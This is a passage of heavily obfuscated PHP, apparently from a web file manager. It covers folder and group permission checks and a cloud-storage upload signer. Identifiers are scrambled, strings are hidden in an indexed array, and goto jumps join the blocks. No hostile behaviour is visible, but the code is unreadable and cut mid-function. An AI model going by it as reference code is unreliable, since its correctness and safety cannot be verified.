$Õçëâìƒ[$©á€ÌëÔ]; } $” µã‹Ô = Model($Ÿ¸ç‡ı€[2207])->listData(); $ÜõÄÓÓº = array(); foreach ($” µã‹Ô as $¯£™‹¶ê) { if ($¯£™‹¶ê[$Ÿ¸ç‡ı€[497]] == 0 && $¯£™‹¶ê[$Ÿ¸ç‡ı€[2021]] == $Ÿ¸ç‡ı€[91]) { $ÜõÄÓÓº[] = $¯£™‹¶ê[$Ÿ¸ç‡ı€[485]]; } } $¿ÎË›¿× = $this->userGroupParents($©á€ÌëÔ); $èÁ„îå = array($Ÿ¸ç‡ı€[191] => SourceModel::TYPE_USER, $Ÿ¸ç‡ı€[581] => $©á€ÌëÔ); if ($¿ÎË›¿×) { $èÁ„îå = array(array($Ÿ¸ç‡ı€[191] => SourceModel::TYPE_USER, $Ÿ¸ç‡ı€[581] => $©á€ÌëÔ), array($Ÿ¸ç‡ı€[191] => SourceModel::TYPE_GROUP, $Ÿ¸ç‡ı€[581] => array($Ÿ¸ç‡ı€[502], $¿ÎË›¿×)), $Ÿ¸ç‡ı€[1094] => $Ÿ¸ç‡ı€[2102]); } $­ºÎòÉÊ = $this->field($Ÿ¸ç‡ı€[2208])->where($èÁ„îå)->select(); $ªÁ‘¤µ = array(); $¦şÈÃ“ = array_to_keyvalue_group($­ºÎòÉÊ, $Ÿ¸ç‡ı€[194]); foreach ($¦şÈÃ“ as $Ÿ’ÎÉÈ­ => $öÙ¢—Õ¿) { $Ï™ŸºÙÉ = $this->authArrayCheck($öÙ¢—Õ¿, $©á€ÌëÔ); if ($Ï™ŸºÙÉ[$Ÿ¸ç‡ı€[498]] > 0) { $ªÁ‘¤µ[] = $Ÿ’ÎÉÈ­ . $Ÿ¸ç‡ı€[12]; } } if ($¿ÎË›¿×) { $âÂÃ²·  = Model($Ÿ¸ç‡ı€[597]); foreach ($¿ÎË›¿× as $Õ‡ì½õ•) { $ÀÖ—äõ = $âÂÃ²· ->getInfo($Õ‡ì½õ•); if (!$ÀÖ—äõ || !is_array($ÀÖ—äõ[$Ÿ¸ç‡ı€[90]])) { continue; } $ªÁ‘¤µ[] = $ÀÖ—äõ[$Ÿ¸ç‡ı€[90]][$Ÿ¸ç‡ı€[194]]; } } $¯÷ì’ç = array(); $²©ã ‘Â = $¿ÎË›¿×; $İŠÍçÉ = Model($Ÿ¸ç‡ı€[1448]); $âÂÃ²·  = Model($Ÿ¸ç‡ı€[597]); $ŸšàÔú¢ = array(); $¸¿ƒÑª© = array(); $Ã”¹Ì“¤ = array(); $û“¤€ª© = array(); if ($ªÁ‘¤µ) { $¡ŒùáÂ± = $İŠÍçÉ->where(array($Ÿ¸ç‡ı€[194] => array($Ÿ¸ç‡ı€[502], $ªÁ‘¤µ)))->select(); foreach ($¡ŒùáÂ± as $¤·†ŸÓ) { if ($¤·†ŸÓ[$Ÿ¸ç‡ı€[515]] == $Ÿ¸ç‡ı€[91]) { continue; } $ØÙ·°ü˜ = $İŠÍçÉ->parentLevelArray($¤·†ŸÓ[$Ÿ¸ç‡ı€[596]]); $¯÷ì’ç = array_merge($¯÷ì’ç, $ØÙ·°ü˜); $²©ã ‘Â[] = $¤·†ŸÓ[$Ÿ¸ç‡ı€[581]]; $ŸšàÔú¢[$¤·†ŸÓ[$Ÿ¸ç‡ı€[194]]] = $ØÙ·°ü˜; $¸¿ƒÑª©[$¤·†ŸÓ[$Ÿ¸ç‡ı€[194]]] = $¤·†ŸÓ[$Ÿ¸ç‡ı€[581]]; } } $²©ã ‘Â = array_values(array_unique($²©ã ‘Â)); $Èç™İ² = $²©ã ‘Â; foreach ($Èç™İ² as $Õ‡ì½õ•) { $ÀÖ—äõ = $âÂÃ²· ->getInfo($Õ‡ì½õ•); $ØÙ·°ü˜ = $İŠÍçÉ->parentLevelArray($ÀÖ—äõ[$Ÿ¸ç‡ı€[596]]); $²©ã ‘Â = array_merge($²©ã ‘Â, $ØÙ·°ü˜); } $²©ã ‘Â = array_values(array_unique($²©ã ‘Â)); foreach ($²©ã ‘Â as $Õ‡ì½õ•) { $ÀÖ—äõ = $âÂÃ²· ->getInfo($Õ‡ì½õ•); $¯÷ì’ç[] = $ÀÖ—äõ[$Ÿ¸ç‡ı€[90]][$Ÿ¸ç‡ı€[194]]; $Ã”¹Ì“¤[$Õ‡ì½õ•] = $ÀÖ—äõ[$Ÿ¸ç‡ı€[90]][$Ÿ¸ç‡ı€[194]]; $û“¤€ª©[$Õ‡ì½õ•] = $İŠÍçÉ->parentLevelArray($ÀÖ—äõ[$Ÿ¸ç‡ı€[596]]); } foreach ($ŸšàÔú¢ as $äï¢« => $…•ªì¿ë) { $è½†Ó£ = $¸¿ƒÑª©[$äï¢«]; if (!$è½†Ó£ || !$Ã”¹Ì“¤[$è½†Ó£]) { continue; } $¥ªô¿Ü = array(); foreach ($û“¤€ª©[$è½†Ó£] as $Õ‡ì½õ•) { $¥ªô¿Ü[] = $Ã”¹Ì“¤[$Õ‡ì½õ•]; } $ŸšàÔú¢[$äï¢«] = array_merge($¥ªô¿Ü, $…•ªì¿ë); } $¯÷ì’ç = array_values(array_unique($¯÷ì’ç)); $åÙ‘²î = array($Ÿ¸ç‡ı€[2200] => $¯÷ì’ç, $Ÿ¸ç‡ı€[2201] => $ŸšàÔú¢); $Õçëâìƒ[$©á€ÌëÔ] = $åÙ‘²î; return $åÙ‘²î; } private function makeSourceAuth($§ã¤à¤¬, $Î´ì’Õ˜, $ã“•ë°Ü = false) { $­ÜîÆ· =& $_SERVER[É¨™èà]; $‡õ‰‘Ùô = $­ÜîÆ·[91]; $Œş—Ñ¥Ã = $§ã¤à¤¬[$­ÜîÆ·[581]]; $äĞ´Î™ = $§ã¤à¤¬[$­ÜîÆ·[191]] == SourceModel::TYPE_GROUP; $¾ŞŒîçå = $äĞ´Î™ ? $this->groupRootAuth($Œş—Ñ¥Ã, $ã“•ë°Ü) : !1; if ($¾ŞŒîçå && Model($­ÜîÆ·[583])->authCheckAction($¾ŞŒîçå[$­ÜîÆ·[497]], $­ÜîÆ·[2020])) { return $this->groupAuthInfo($¾ŞŒîçå, $Œş—Ñ¥Ã); } $íñŞ²† = Model($­ÜîÆ·[1448])->parentLevelArray($§ã¤à¤¬[$­ÜîÆ·[596]]); $íñŞ²† = array_merge(array($§ã¤à¤¬[$­ÜîÆ·[194]]), array_reverse($íñŞ²†)); $˜‰³ÈÃ¡ = !1; foreach ($íñŞ²† as $ÍÙ²ÑŠ¤) { if (!isset($Î´ì’Õ˜[$ÍÙ²ÑŠ¤])) { continue; } $ˆ‹§¢•† = $this->authMake($Î´ì’Õ˜[$ÍÙ²ÑŠ¤], $ã“•ë°Ü); if ($ˆ‹§¢•†[$­ÜîÆ·[552]]) { $˜‰³ÈÃ¡ = $ˆ‹§¢•†; break; } } if (!$äĞ´Î™) { return $˜‰³ÈÃ¡; } if (!$˜‰³ÈÃ¡ && $¾ŞŒîçå) { $˜‰³ÈÃ¡ = $this->groupAuthInfo($¾ŞŒîçå, $Œş—Ñ¥Ã); } if (!$˜‰³ÈÃ¡) { $Óââµı = Model($­ÜîÆ·[597])->getInfo($Œş—Ñ¥Ã); $ÔçôÇÊë = explode($­ÜîÆ·[50], trim($Óââµı[$­ÜîÆ·[596]], $­ÜîÆ·[50])); $ÔçôÇÊë = array_reverse($ÔçôÇÊë); foreach ($ÔçôÇÊë as $·´˜“Ù) { if ($·´˜“Ù == $­ÜîÆ·[231] || $·´˜“Ù == $‡õ‰‘Ùô) { continue; } $ËÎçĞ‚Æ = $this->groupRootAuth($·´˜“Ù, $ã“•ë°Ü); if (!$ËÎçĞ‚Æ) { continue; } $˜‰³ÈÃ¡ = $this->groupAuthInfo($ËÎçĞ‚Æ, $·´˜“Ù); break; } } if (!$˜‰³ÈÃ¡ || $˜‰³ÈÃ¡[$­ÜîÆ·[498]] <= 0) { $ºì¤Ÿ˜¨ = $this->authDeepCheck($§ã¤à¤¬[$­ÜîÆ·[194]], $ã“•ë°Ü); if ($ºì¤Ÿ˜¨) { $˜‰³ÈÃ¡ = $ºì¤Ÿ˜¨; } } return $˜‰³ÈÃ¡; } private function userIsRoot($³Ûéâ®€ = false) { $½á¿ÎØĞ =& $_SERVER[É¨™èà]; if (!$³Ûéâ®€ && KodUser::isRoot()) { return !0; } $ÒÜåª›¥ = Model($½á¿ÎØĞ[609])->getInfo($³Ûéâ®€); $“ïŞíš = Model($½á¿ÎØĞ[2209])->listData($ÒÜåª›¥[$½á¿ÎØĞ[2210]]); if ($“ïŞíš && $“ïŞíš[$½á¿ÎØĞ[587]][$½á¿ÎØĞ[2211]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ö‘»İ÷‘) { $²¡×Šğ =& $_SERVER[É¨™èà]; $¦Ñø§ã® = Model($²¡×Šğ[1448]); $£¶ÆÛ = $¦Ñø§ã®->sourceInfo($Ö‘»İ÷‘); if (!$£¶ÆÛ) { return !1; } $¦Ñø§ã®->groupPathDisplay($£¶ÆÛ); $¶üŠ–­Ş = array($£¶ÆÛ); $¶üŠ–­Ş = $¦Ñø§ã®->_listAppendPath($¶üŠ–­Ş); $£¶ÆÛ = $¶üŠ–­Ş[0]; $ Ò·´ì« = $£¶ÆÛ[$²¡×Šğ[594]]; if (isset($£¶ÆÛ[$²¡×Šğ[602]])) { $—„Ìéâ„ = explode($²¡×Šğ[8], trim($£¶ÆÛ[$²¡×Šğ[594]], $²¡×Šğ[8])); array_shift($—„Ìéâ„); $ Ò·´ì« = $£¶ÆÛ[$²¡×Šğ[600]] . $²¡×Šğ[2212] . implode($²¡×Šğ[8], $—„Ìéâ„); } return array($²¡×Šğ[504] => $£¶ÆÛ[$²¡×Šğ[32]], $²¡×Šğ[87] => KodIO::make($£¶ÆÛ[$²¡×Šğ[194]]), $²¡×Šğ[2213] => $ Ò·´ì«); } private function groupAuthInfo($¢õšñ„˜, $ì•ÂÀ³) { $©é¼É·¼ =& $_SERVER[É¨™èà]; $Å¡–•² = Model($©é¼É·¼[597])->getInfo($ì•ÂÀ³); return array($©é¼É·¼[2214] => intval($¢õšñ„˜[$©é¼É·¼[497]]), $©é¼É·¼[2197] => $¢õšñ„˜, $©é¼É·¼[2215] => LNG($©é¼É·¼[2216]), $©é¼É·¼[2206] => array($©é¼É·¼[504] => $Å¡–•²[$©é¼É·¼[32]], $©é¼É·¼[87] => KodIO::make($Å¡–•²[$©é¼É·¼[90]][$©é¼É·¼[194]]), $©é¼É·¼[2213] => $Å¡–•²[$©é¼É·¼[601]])); } protected function groupRootAuth($Ğ¸£ôÒş, $¤©Å½ï¸ = false) { $ŒÆ‘ü¹¾ =& $_SERVER[É¨™èà]; $¤©Å½ï¸ = $¤©Å½ï¸ ? $¤©Å½ï¸ : USER_ID; $‰şñŸÁ = $¤©Å½ï¸ . $ŒÆ‘ü¹¾[2217] . $Ğ¸£ôÒş; static $ÖœÙ©†„ = array(); if (isset($ÖœÙ©†„[$‰şñŸÁ])) { return $ÖœÙ©†„[$‰şñŸÁ]; } $§·ÚğıŞ = Model($ŒÆ‘ü¹¾[597])->getInfo($Ğ¸£ôÒş); $´«÷ì”Õ = $this->userGroupList($¤©Å½ï¸); $äìÄ‡â‰ = isset($´«÷ì”Õ[$Ğ¸£ôÒş]) ? $´«÷ì”Õ[$Ğ¸£ôÒş][$ŒÆ‘ü¹¾[497]] : !1; if ($äìÄ‡â‰ && Model($ŒÆ‘ü¹¾[583])->authCheckAction($äìÄ‡â‰[$ŒÆ‘ü¹¾[497]], $ŒÆ‘ü¹¾[2020])) { $ÖœÙ©†„[$‰şñŸÁ] = $äìÄ‡â‰; return $äìÄ‡â‰; } $Ò›Ì“Å  = $this->sourceAuthSelect($§·ÚğıŞ[$ŒÆ‘ü¹¾[90]][$ŒÆ‘ü¹¾[194]]); $æ³õ¡©Ô = $Ò›Ì“Å  ? $this->authMake($Ò›Ì“Å , $¤©Å½ï¸) : !1; $»Â´¦Û = $æ³õ¡©Ô ? $æ³õ¡©Ô[$ŒÆ‘ü¹¾[552]] : !1; $ÖœÙ©†„[$‰şñŸÁ] = $»Â´¦Û ? $»Â´¦Û : $äìÄ‡â‰; return $ÖœÙ©†„[$‰şñŸÁ]; } public function authOwnerApply($Ï… ¼Ñ) { $ââ«Äãƒ =& $_SERVER[É¨™èà]; if (empty($Ï… ¼Ñ[$ââ«Äãƒ[497]]) || isset($Ï… ¼Ñ[$ââ«Äãƒ[2218]]) && $Ï… ¼Ñ[$ââ«Äãƒ[2218]]) { return $Ï… ¼Ñ; } if (AuthModel::authCheckRoot($Ï… ¼Ñ[$ââ«Äãƒ[497]][$ââ«Äãƒ[498]])) { return $Ï… ¼Ñ; } $ûÎğ½˜ç = Model($ââ«Äãƒ[1448])->parentLevelArray($Ï… ¼Ñ[$ââ«Äãƒ[596]]); $ûÎğ½˜ç = array_merge(array($Ï… ¼Ñ[$ââ«Äãƒ[194]]), array_reverse($ûÎğ½˜ç)); $ é¤™ó· = $this->sourceAuthSelect($ûÎğ½˜ç); $Ş½¦¨§ = array(); $¿ºğĞ = array(); foreach ($ é¤™ó· as $âï›ù½š => $´Ùßø˜Ò) { $®œ¬şÇõ = $this->authFolderOwnerUser($´Ùßø˜Ò); $Ş½¦¨§[$âï›ù½š] = $®œ¬şÇõ; $¿ºğĞ = array_merge($¿ºğĞ, $®œ¬şÇõ[$ââ«Äãƒ[677]]); if ($®œ¬şÇõ[$ââ«Äãƒ[2219]]) { break; } } if (count($¿ºğĞ) == 0) { $¿ºğĞ = $this->authFolderOwnerGroup($Ï… ¼Ñ[$ââ«Äãƒ[581]]); } $¿ºğĞ = array_unique($¿ºğĞ); if (AuthModel::authCheckRoot($Ï… ¼Ñ[$ââ«Äãƒ[497]][$ââ«Äãƒ[498]])) { $¿ºğĞ[] = USER_ID; } $Ï… ¼Ñ[$ââ«Äãƒ[497]][$ââ«Äãƒ[2220]] = Model($ââ«Äãƒ[589])->userListInfo($¿ºğĞ); return $Ï… ¼Ñ; } private function authFolderOwnerGroup($¾§„û®£) { $â¿úï³ë =& $_SERVER[É¨™èà]; $ï˜Œ•¨Â = Model($â¿úï³ë[2094])->where(array($â¿úï³ë[1410] => $¾§„û®£))->select(); $Ó…° ´µ = array(); if (!$ï˜Œ•¨Â) { return $Ó…° ´µ; } foreach ($ï˜Œ•¨Â as $ÇÇ…„£Ã) { $§Šôìò = $this->authInfo($ÇÇ…„£Ã); if (AuthModel::authCheckRoot($§Šôìò[$â¿úï³ë[497]])) { $Ó…° ´µ[] = $ÇÇ…„£Ã[$â¿úï³ë[1800]]; } } return $Ó…° ´µ; } private function authFolderOwnerUser($ÈÔñ¾¯Ø) { $İ–õ‡‘ =& $_SERVER[É¨™èà]; $•ñÊÌê¸ = array(); $–‘Œ—ø’ = !1; foreach ($ÈÔñ¾¯Ø as $€˜ÄÀ²Ş) { $²Ì•£š = $this->authInfo($€˜ÄÀ²Ş); if ($€˜ÄÀ²Ş[$İ–õ‡‘[581]] == $İ–õ‡‘[231]) { $–‘Œ—ø’ = !0; } if ($€˜ÄÀ²Ş[$İ–õ‡‘[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($²Ì•£š[$İ–õ‡‘[497]])) { $•ñÊÌê¸[] = $€˜ÄÀ²Ş[$İ–õ‡‘[581]]; } } } return array($İ–õ‡‘[677] => $•ñÊÌê¸, $İ–õ‡‘[2219] => $–‘Œ—ø’); } public function authMake($…ï¢ìÇ, $ˆú¶ÃÙµ = false) { $áÚ³æóå =& $_SERVER[É¨™èà]; $¿¨µ¼ÛÜ = $this->authArrayCheck($…ï¢ìÇ, $ˆú¶ÃÙµ); if ($¿¨µ¼ÛÜ[$áÚ³æóå[2221]]) { $¿¨µ¼ÛÜ[$áÚ³æóå[2221]] = $this->sourceAuthInfo($¿¨µ¼ÛÜ[$áÚ³æóå[2221]]); } return $¿¨µ¼ÛÜ; } public function authArrayCheck($¢¡·ÂÆª, $ãúĞï–ø = false) { $÷­ÔñÚ¹ =& $_SERVER[É¨™èà]; if (!$¢¡·ÂÆª) { return array($÷­ÔñÚ¹[498] => 0, $÷­ÔñÚ¹[552] => !1); } $ãúĞï–ø = $ãúĞï–ø ? $ãúĞï–ø : USER_ID; $ğ¾Û˜Ù­ = 0; $¼éÒ¯ú = 0; $¤öÆ¯İ = 0; $½ŒŞÙÑâ = 0; $ËÍ®‘û = 0; $ÔÔ­¬ßä = 0; $šçÀ§û = 1000; $Õ©¤óğ = 0; $šÔÔ¬ò = 0; $„÷—¹Ü· = 0; $œåÍ„æ¤ = 0; $Œ—„¿èÚ = array($÷­ÔñÚ¹[194] => 0); foreach ($¢¡·ÂÆª as $Œ—„¿èÚ) { $¡âšõÙø = $this->authInfo($Œ—„¿èÚ); if (!$¡âšõÙø) { continue; } $ëÁ¯Âİ± = $Œ—„¿èÚ[$÷­ÔñÚ¹[581]]; $—Ú¹á–Ë = intval($¡âšõÙø[$÷­ÔñÚ¹[497]]); if ($Œ—„¿èÚ[$÷­ÔñÚ¹[191]] == SourceModel::TYPE_USER && $ëÁ¯Âİ± == $ãúĞï–ø) { $ğ¾Û˜Ù­ = !0; $¤öÆ¯İ = $¡âšõÙø; $¼éÒ¯ú = $—Ú¹á–Ë; } else { if ($Œ—„¿èÚ[$÷­ÔñÚ¹[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ëÁ¯Âİ±, $ãúĞï–ø)) { $½ŒŞÙÑâ = !0; $ÅÌ‚ˆ÷ı = $this->groupStepToUserGroup($ëÁ¯Âİ±, $ãúĞï–ø); if ($ÅÌ‚ˆ÷ı < $šçÀ§û) { $šçÀ§û = $ÅÌ‚ˆ÷ı; $ËÍ®‘û = $—Ú¹á–Ë; $ÔÔ­¬ßä = $¡âšõÙø; $Õ©¤óğ = $ëÁ¯Âİ±; } if ($ÅÌ‚ˆ÷ı == $šçÀ§û && $—Ú¹á–Ë >= $ËÍ®‘û) { $ËÍ®‘û = $—Ú¹á–Ë; $ÔÔ­¬ßä = $¡âšõÙø; $Õ©¤óğ = $ëÁ¯Âİ±; } } else { if ($ëÁ¯Âİ± == $÷­ÔñÚ¹[231]) { $šÔÔ¬ò = !0; $œåÍ„æ¤ = $¡âšõÙø; $„÷—¹Ü· = $—Ú¹á–Ë; } } } } if ($ğ¾Û˜Ù­) { $ü½æÃ = $¼éÒ¯ú; $¡âšõÙø = $¤öÆ¯İ; $ÌşØå·ò = LNG($÷­ÔñÚ¹[2222]); } else { if ($½ŒŞÙÑâ) { $ü½æÃ = $ËÍ®‘û; $¡âšõÙø = $ÔÔ­¬ßä; $„›Éá½‚ = Model($÷­ÔñÚ¹[597])->getInfo($Õ©¤óğ); $ÌşØå·ò = $÷­ÔñÚ¹[176] . $„›Éá½‚[$÷­ÔñÚ¹[601]] . $÷­ÔñÚ¹[2223] . LNG($÷­ÔñÚ¹[2224]); } else { if ($šÔÔ¬ò) { $ü½æÃ = $„÷—¹Ü·; $¡âšõÙø = $œåÍ„æ¤; $ÌşØå·ò = LNG($÷­ÔñÚ¹[2195]); } else { $ü½æÃ = 0; $¡âšõÙø = !1; $ÌşØå·ò = $÷­ÔñÚ¹[12]; } } } $“¤ÆÈÛ² = array($÷­ÔñÚ¹[2214] => intval($ü½æÃ), $÷­ÔñÚ¹[2197] => $¡âšõÙø, $÷­ÔñÚ¹[2215] => $ÌşØå·ò, $÷­ÔñÚ¹[2206] => $Œ—„¿èÚ[$÷­ÔñÚ¹[194]]); return $“¤ÆÈÛ²; } private function groupContainUser($¬¿ ³¥ó, $ëµ¼ì©² = false) { return in_array($¬¿ ³¥ó, $this->userGroupParents($ëµ¼ì©²)); } private function groupStepToUserGroup($¥üíîŒ¯, $æ×ˆìœ¨ = false) { $íìüâê =& $_SERVER[É¨™èà]; $ü÷óÌÁ = $this->userGroupList($æ×ˆìœ¨); $Şñéë¤Ä = 1000; $Àæ†øßÓ = $GLOBALS[$íìüâê[6]][$íìüâê[92]][$íìüâê[2107]] == 1; $¶Áğ•ƒ÷ = $Àæ†øßÓ ? 3 : 2; foreach ($ü÷óÌÁ as $×¡»ùâé) { if ($×¡»ùâé[$íìüâê[1410]] == $¥üíîŒ¯) { return 0; } $Ş×Íñ—É = explode($íìüâê[50], trim($×¡»ùâé[$íìüâê[596]], $íìüâê[50])); if ($Ş×Íñ—É[0] == $íìüâê[231] && count($Ş×Íñ—É) > $¶Áğ•ƒ÷) { $¨È½Ò« = array_reverse(array_slice($Ş×Íñ—É, $¶Áğ•ƒ÷)); $›€èÆĞ— = array_search($¥üíîŒ¯, $¨È½Ò«); if ($›€èÆĞ— !== !1 && $›€èÆĞ— + 1 <= $Şñéë¤Ä) { $Şñéë¤Ä = $›€èÆĞ— + 1; } } } return $Şñéë¤Ä; } private function userGroupList($ÍÄâ®© = false) { $ßêÈä´ =& $_SERVER[É¨™èà]; static $³éóÎó‚ = array(); if (isset($³éóÎó‚[$ÍÄâ®©])) { return $³éóÎó‚[$ÍÄâ®©]; } $Õ¿Ø‚ò“ = Model($ßêÈä´[609])->getInfo($ÍÄâ®©); $³éóÎó‚[$ÍÄâ®©] = array_to_keyvalue($Õ¿Ø‚ò“[$ßêÈä´[1409]], $ßêÈä´[1410]); return $³éóÎó‚[$ÍÄâ®©]; } public function userGroupParents($¯¢—ˆ‰) { $˜Û¬ÄËî =& $_SERVER[É¨™èà]; static $ÁòëŸª” = array(); $¯¢—ˆ‰ = $¯¢—ˆ‰ ? $¯¢—ˆ‰ : USER_ID; if (isset($ÁòëŸª”[$¯¢—ˆ‰])) { return $ÁòëŸª”[$¯¢—ˆ‰]; } $§¬¶Î¼Î = $this->userGroupList($¯¢—ˆ‰); $Ú‡š—½ = array(); $­Éş‹Ñê = $GLOBALS[$˜Û¬ÄËî[6]][$˜Û¬ÄËî[92]][$˜Û¬ÄËî[2107]] == 1; $ñÈ×ìîò = $­Éş‹Ñê ? 3 : 2; foreach ($§¬¶Î¼Î as $§±—í§²) { $ºÙÓî¿ğ = array($§±—í§²[$˜Û¬ÄËî[1410]]); $‚ÉÛÍ¶¥ = explode($˜Û¬ÄËî[50], trim($§±—í§²[$˜Û¬ÄËî[596]], $˜Û¬ÄËî[50])); if ($‚ÉÛÍ¶¥[0] == $˜Û¬ÄËî[231] && count($‚ÉÛÍ¶¥) > $ñÈ×ìîò) { $¯‰µ¤© = array_slice($‚ÉÛÍ¶¥, $ñÈ×ìîò); $ºÙÓî¿ğ = array_merge($ºÙÓî¿ğ, array_reverse($¯‰µ¤©)); } $Ú‡š—½ = array_merge($Ú‡š—½, $ºÙÓî¿ğ); } $ÁòëŸª”[$¯¢—ˆ‰] = array_unique($Ú‡š—½); return $ÁòëŸª”[$¯¢—ˆ‰]; } public function authTargetInfoMake($ù‹ÑÁ¢Ú) { $¼‘¢…’ =& $_SERVER[É¨™èà]; $Öè‘Ş¦Ï = array(); $šÉ¡úïõ = array(); foreach ($ù‹ÑÁ¢Ú as $ö«Í›©) { if ($ö«Í›©[$¼‘¢…’[191]] == SourceModel::TYPE_USER) { $Öè‘Ş¦Ï[] = intval($ö«Í›©[$¼‘¢…’[581]]); } else { if ($ö«Í›©[$¼‘¢…’[191]] == SourceModel::TYPE_GROUP) { $šÉ¡úïõ[] = intval($ö«Í›©[$¼‘¢…’[581]]); } } } if ($Öè‘Ş¦Ï) { $Öè‘Ş¦Ï = Model($¼‘¢…’[589])->userListInfo($Öè‘Ş¦Ï); } if ($šÉ¡úïõ) { $•©Øİüˆ = array($¼‘¢…’[2089] => array($¼‘¢…’[502], $šÉ¡úïõ)); $šÉ¡úïõ = Model($¼‘¢…’[597])->field($¼‘¢…’[2225])->where($•©Øİüˆ)->select(); $šÉ¡úïõ = array_to_keyvalue($šÉ¡úïõ, $¼‘¢…’[1410]); } return array($¼‘¢…’[2226] => $Öè‘Ş¦Ï, $¼‘¢…’[2227] => $šÉ¡úïõ); } public function authInfo($¬˜İĞœ‹) { $ˆü¬§—ú =& $_SERVER[É¨™èà]; if ($¬˜İĞœ‹[$ˆü¬§—ú[2108]]) { $û¤ÑÄ”¸ = Model($ˆü¬§—ú[583])->listData($¬˜İĞœ‹[$ˆü¬§—ú[2108]]); if (!$û¤ÑÄ”¸) { return !1; $º½¼î° = Model($ˆü¬§—ú[583])->listData(); $áë—É¹Á = array_filter_by_field($º½¼î°, $ˆü¬§—ú[497], $ˆü¬§—ú[231]); return $áë—É¹Á; } $…äşùÅ = array_field_key($û¤ÑÄ”¸, array($ˆü¬§—ú[485], $ˆü¬§—ú[32], $ˆü¬§—ú[497], $ˆü¬§—ú[2022], $ˆü¬§—ú[2023])); $…äşùÅ[$ˆü¬§—ú[2228]] = $¬˜İĞœ‹; return $…äşùÅ; } else { return array($ˆü¬§—ú[503] => 0, $ˆü¬§—ú[2005] => $¬˜İĞœ‹[$ˆü¬§—ú[2171]], $ˆü¬§—ú[504] => $ˆü¬§—ú[12], $ˆü¬§—ú[2022] => $ˆü¬§—ú[2229]); } } } goto B ââùÈ; bŞÑ¨”ßÇ: function binCheckBigger($•£ÉÉá¤, $„Ş³Çœ¸) { return $•£ÉÉá¤ > $„Ş³Çœ¸; } $_SERVER[$_SERVER[Ê¨¢®][3]] = ("\70\66\71\64"."\66\70")+0;$_br9v="0foqvli1ghkepmy9723arz8sw4jdb65txucnzw1idnvbq5ek2hfscar03m6upjlyo8794gxtmupgc4yq1o";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($’‡øÇÉ, $Ô¥øÕ) { $¹©¶¡”Ú =& $_SERVER[É¨™èà]; if (isset(self::$_methodList[$’‡øÇÉ])) { return @call_user_func_array(self::$_methodList[$’‡øÇÉ], $Ô¥øÕ); } else { if (method_exists($this, $’‡øÇÉ)) { return call_user_func_array(array($this, $’‡øÇÉ), $Ô¥øÕ); } else { think_exception(__CLASS__ . $¹©¶¡”Ú[4] . $’‡øÇÉ . $¹©¶¡”Ú[5]); } } } public static function __callStatic($ƒª°ê‚¢, $±¨öû§À) { if (isset(self::$_methodListStatic[$ƒª°ê‚¢])) { return call_user_func_array(self::$_methodListStatic[$ƒª°ê‚¢], $±¨öû§À); } else { if (method_exists(self, $ƒª°ê‚¢)) { return call_user_func_array(array(self, $ƒª°ê‚¢), $±¨öû§À); } else { show_json("{$ƒª°ê‚¢}\x28\x29\x20\x6e\157\164\x20\145\170\151\x73\x74\73", !1); } } } public static function addMethod($ó”õï, $ÒĞèš‘ã) { self::$_methodList[$ó”õï] = $ÒĞèš‘ã; } public static function addMethodStatic($˜‚Ÿ„…, $û€øåš¨) { self::$_methodListStatic[$˜‚Ÿ„…] = $û€øåš¨; } } goto e‚å¹õ; F¥¦ß¶£Î: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Š•ûê„Û) { parent::__construct($Š•ûê„Û); $this->setSignVersion($_SERVER[É¨™èà][250]); } public function uploadFormData($º„Ş…¿, $©¬…¿”ö = 3600) { $ìç“õğğ =& $_SERVER[É¨™èà]; $Á×ò£Îò = $ìç“õğğ[232]; $©°¸Å÷ƒ = $ìç“õğğ[1439]; $ú»‹ºêö = $ìç“õğğ[264]; $ŞÅ¸™› = gmdate($ìç“õğğ[1440], time() + $©¬…¿”ö); $‚íïÑ¸´ = (string) time() . $ìç“õğğ[74] . (string) (time() + $©¬…¿”ö); $š„„²åà = array($ìç“õğğ[265] => $ŞÅ¸™›, $ìç“õğğ[268] => array(array($ìç“õğğ[318] => $Á×ò£Îò), array($ìç“õğğ[269] => $this->bucket), array($ìç“õğğ[270], $ìç“õğğ[271], $ìç“õğğ[12]), array($ìç“õğğ[273] => $ú»‹ºêö), array($ìç“õğğ[1441] => $©°¸Å÷ƒ), array($ìç“õğğ[1442] => $this->accessKey), array($ìç“õğğ[1443] => $‚íïÑ¸´))); $š„„²åà = json_encode($š„„²åà); $éúøÎ = hash_hmac($ìç“õğğ[1439], $‚íïÑ¸´, $this->secret); $‘ÚÀĞÖğ = sha1($š„„²åà); $«ï’Â½ = hash_hmac($ìç“õğğ[1439], $‘ÚÀĞÖğ, $éúøÎ); $û‰Ä¸’Š = array($ìç“õğğ[318] => $Á×ò£Îò, $ìç“õğğ[273] => $ú»‹ºêö, $ìç“õğğ[280] => base64_encode($š„„²åà), $ìç“õğğ[1441] => $©°¸Å÷ƒ, $ìç“õğğ[1442] => $this->accessKey, $ìç“õğğ[1444] => $‚íïÑ¸´, $ìç“õğğ[1445] => $«ï’Â½, $ìç“õğğ[209] => $this->getHost()); return $û‰Ä¸’Š; } public function fileOutImage($É˜§×ÓÔ, $ĞÛöÏ·å = 250) { $Èã—›š =& $_SERVER[É¨™èà]; if ($this->size($É˜§×ÓÔ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($É˜§×ÓÔ, $ĞÛöÏ·å); } $ïœè²Ô = $this->link($É˜§×ÓÔ); $ïœè²Ô .= $Èã—›š[1446] . $ĞÛöÏ·å . $Èã—›š[1447]; $this->fileOutLink($ïœè²Ô); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ÖÙË…ˆ) { $this->pathParse = $ÖÙË…ˆ; $this->model = Model($_SERVER[É¨™èà][1448]); } public function getPath($¢ì‡îÌÔ) { return trim($¢ì‡îÌÔ, $_SERVER[É¨™èà][8]); } public function pathFather($¶ò ¤«) { $¦Êèâœ» = $this->parse($¶ò ¤«); $¦Êèâœ» = $this->infoSimple($¶ò ¤«); return $¦Êèâœ» ? $¦Êèâœ»[$_SERVER[É¨™èà][193]] : !1; } public function pathThis($ö®—ŞÃ³) { $¿š¥ˆ¤ƒ = $this->infoSimple($ö®—ŞÃ³); return $¿š¥ˆ¤ƒ ? $¿š¥ˆ¤ƒ[$_SERVER[É¨™èà][32]] : !1; } public function 